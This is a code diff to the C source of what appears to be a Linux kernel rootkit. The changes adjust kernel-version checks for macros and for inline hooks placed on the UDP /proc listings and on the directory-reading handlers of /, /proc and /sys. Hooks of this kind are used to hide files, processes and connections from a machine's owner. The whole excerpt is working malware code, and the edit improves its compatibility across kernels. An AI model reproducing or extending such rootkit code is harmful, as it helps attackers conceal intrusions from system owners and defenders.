@@ -895,7 +895,7 @@ static int n_udp6_seq_show ( struct seq_file *seq, void *v )
     }
 
 
-#if LINUX_VERSION_CODE <= KERNEL_VERSION(3, 3, 0)
+#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 11, 0)
 
     #define READDIR(NAME) \
         int NAME##_readdir(struct file *file, void *dirent, filldir_t filldir) \
@@ -911,7 +911,7 @@ static int n_udp6_seq_show ( struct seq_file *seq, void *v )
             return ret; \
         }
 
-#elif LINUX_VERSION_CODE > KERNEL_VERSION(3, 3, 0)
+#elif LINUX_VERSION_CODE >= KERNEL_VERSION(3, 11, 0)
 
     #define READDIR(NAME) \
         int NAME##_iterate(struct file *file, struct dir_context *context) \
@@ -1225,21 +1225,20 @@ int init(void)
     asm_hook_create(get_udp_seq_show("/proc/net/udp"), n_udp4_seq_show);
     asm_hook_create(get_udp_seq_show("/proc/net/udp6"), n_udp6_seq_show);	
 
-#if LINUX_VERSION_CODE >= KERNEL_VERSION(2, 6, 32) && \
-      LINUX_VERSION_CODE < KERNEL_VERSION(3, 3, 0) 
+#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 11, 0) 
 	
     asm_hook_create(get_fop("/")->readdir, root_readdir);
     asm_hook_create(get_fop("/proc")->readdir, proc_readdir);
     asm_hook_create(get_fop("/sys")->readdir, sys_readdir);
 
-#elif LINUX_VERSION_CODE >= KERNEL_VERSION(3, 3, 0) && \
-      LINUX_VERSION_CODE < KERNEL_VERSION(4, 5, 0) 
+#elif LINUX_VERSION_CODE >= KERNEL_VERSION(3, 11, 0) && \
+      LINUX_VERSION_CODE < KERNEL_VERSION(4, 7, 0) 
 
     asm_hook_create(get_fop("/")->iterate, root_iterate);
     asm_hook_create(get_fop("/proc")->iterate, proc_iterate);
     asm_hook_create(get_fop("/sys")->iterate, sys_iterate);
 
-#elif LINUX_VERSION_CODE >= KERNEL_VERSION(4, 5, 0)
+#elif LINUX_VERSION_CODE >= KERNEL_VERSION(4, 7, 0)
 
     asm_hook_create(get_fop("/")->iterate_shared, root_iterate);
     asm_hook_create(get_fop("/proc")->iterate_shared, proc_iterate);
